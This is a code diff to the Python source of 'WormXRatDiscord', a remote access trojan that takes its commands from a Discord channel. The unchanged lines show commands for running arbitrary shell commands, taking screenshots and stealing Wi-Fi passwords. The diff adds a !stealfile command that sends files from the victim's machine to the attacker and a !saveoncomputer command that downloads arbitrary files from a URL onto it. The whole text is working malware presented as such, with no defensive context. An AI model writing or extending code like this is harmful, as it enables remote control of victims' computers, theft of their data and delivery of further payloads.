@@ -12,9 +12,8 @@ import io
 import threading
 from tkinter import messagebox
 
-# Config
 session = uuid.uuid4()
-TOKEN = "" # <------ Token discord
+TOKEN = "" 
 
 current_dir = os.getcwd()
 intents = discord.Intents.default()
@@ -39,7 +38,7 @@ async def send_msg(channel, text):
             await channel.send("⚠️ Log too long", file=discord.File(out_file, filename="output.txt"))
     else:
         await channel.send(f"```\n{text}\n```")
-# Sending message in popup
+
 def show_popup(msg):
     messagebox.showinfo("WormXRatDiscord", msg)
 
@@ -57,7 +56,8 @@ async def on_ready():
             f"📍 Country: `{country}`\n"
             f"Session: `{session}`\n"
             "--- Commands ---\n"
-            "`!cmd <command>` | `!screen` | `!stealwifipasswords` | `!chatsendmsg <text>`"
+            "`!cmd <command>` | `!screen` | `!stealwifipasswords` | `!chatsendmsg <text>`\n"
+            "`!stealfile <file>` | `!saveoncomputer <link>`"
         )
         await channel_ref.send(header)
     except Exception as e:
@@ -98,6 +98,35 @@ async def on_message(message):
             os.remove(path)
         except Exception as e:
             await message.channel.send(f"Screenshot Error: {e}")
+
+    elif message.content.startswith("!stealfile "):
+        filename = message.content[len("!stealfile "):].strip()
+        path = os.path.join(current_dir, filename)
+        if os.path.exists(path) and os.path.isfile(path):
+            try:
+                await message.channel.send(file=discord.File(path))
+            except Exception as e:
+                await message.channel.send(f"❌ Download Error: {e}")
+        else:
+            await message.channel.send("❌ Error: File not found.")
+
+    elif message.content.startswith("!saveoncomputer "):
+        url = message.content[len("!saveoncomputer "):].strip()
+        filename = url.split("/")[-1].split("?")[0]
+        if not filename: filename = "uploaded_file"
+        
+        path = os.path.join(current_dir, filename)
+        try:
+            r = requests.get(url, stream=True)
+            if r.status_code == 200:
+                with open(path, 'wb') as f:
+                    for chunk in r.iter_content(chunk_size=8192):
+                        f.write(chunk)
+                await message.channel.send(f"✅ File uploaded and saved as: `{filename}`")
+            else:
+                await message.channel.send(f"❌ Error: Server returned status {r.status_code}")
+        except Exception as e:
+            await message.channel.send(f"❌ Upload Error: {e}")
 
     elif message.content.startswith("!chatsendmsg "):
         announcemsg = message.content[len("!chatsendmsg "):].strip()
